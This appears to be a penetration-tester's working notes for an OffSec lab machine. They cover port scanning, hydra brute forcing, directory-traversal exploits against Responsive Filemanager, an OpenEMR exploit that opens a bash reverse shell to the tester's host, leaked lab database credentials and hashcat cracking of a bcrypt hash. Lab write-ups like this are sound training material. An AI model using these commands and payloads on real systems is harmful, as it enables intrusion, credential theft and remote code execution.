### Enumeration
```
IP=192.168.163.145
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p80,445,3306 -A $IP
```
### Ports 
- 80
- 445
- 3306
### Foothold
- 21
	- ftp anonymous@$IP
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
- RPC/ SMB
	- enum4linux -U $IP
- 445
	- smbclient -N -L //$IP
		- anonymous login success
		- shares
			- print$
			- docs
			- IPC$
	- nmap --script smb-vuln* -p135,139,445 $IP
		- vulnerable to dos
- 3306
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$IP`
- 80
	- Default landing page
		- ![[Pasted image 20240716112915.png]]
		- ![[Pasted image 20240716113255.png]]
		- ![[Pasted image 20240716113309.png]]
		- Added apex.offsec to /etc/hosts
	- Employees
		- Walter White wwalter@apex.offsec
		- Sarah Jhonson jsarah@apex.offsec
		- William Anderson  awilliam@apex.offsec
		- Amanda Jepson  jamanda@apex.offsec
	- Versions
		- RESPONSIVE filemanager v.9.13.4
			- directory traversal exploit db 49359
				- change name to exploit.py
				- python3 exploit.py http://192.168.163.145 PHPSESSID=2ddat6a28njg2encbfq83b4326 /etc/passwd
				- Works
				- Change output directory to /Documents
				- python3 exploit.py http://192.168.163.145 PHPSESSID=2ddat6a28njg2encbfq83b4326 /var/www/openemr/sites/default/sqlconf.php
				- We see the sqlconf.php in smb share docs
				- Download the sqlconf.php
					- user:openemr
					- pass:C78maEQUIEuQ
			- exploit db 45987
				- `curl -X POST -d "path=../../../../../../../etc/passwd" -H "Cookie: PHPSESSID=2ddat6a28njg2encbfq83b4326" "http://192.168.163.145/filemanager/ajax_calls.php?action=get_file&sub_action=edit&preview_mode=text"`
				- outputs /etc/passwd
		- openemr Version Number: v5.0.1 (1)
			- exploit db 45161
			- `python2 45161.py http://192.168.163.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.195/22 0>&1' Gives rce
	- Directory Brute force
		- dirsearch -u http://$IP
			- /assets/
			- /filemanager/
				- ![[Pasted image 20240716113652.png]]
				- Tried uploading php
					- ![[Pasted image 20240716114030.png]]
				- /upload.php
			- /source/
				- openemr feature.pdf
					- talks about /openemr
			- /thumbs/
			- /openemer
				- ![[Pasted image 20240716120127.png]]
				- openemr 5.0.2.1 RCE
					- exploit db 49784
				- admin:thedoctor
				- Successful login
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
- 3306
	- mysql -u openemr -pC78maEQUIEuQ -h $IP
		- Allows us to connect
		- dbs
			- openemr
				- users
					- admin:NoLongerUsed
					- other accounts are no login
				- users_secure
					- `admin:$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC`
					- `salt:$2a$05$bJcIfCBjN5Fuh0K9qfoe0n$
					- hashcat -m 3200 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
						- thedoctor
			- information_schema
### PE
#### Linux
- www-data
	- id
		- uid=33(www-data) gid=33(www-data) groups=33(www-data)
	- sudo -l
		- needs password
	- uname -a
	- getcap -r / 2>/dev/null
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
	- Users with console
	- netstat -ano
	- linpeas
### Credentials
- openemr:C78maEQUIEuQ
- admin:thedoctor
### Lessons Learned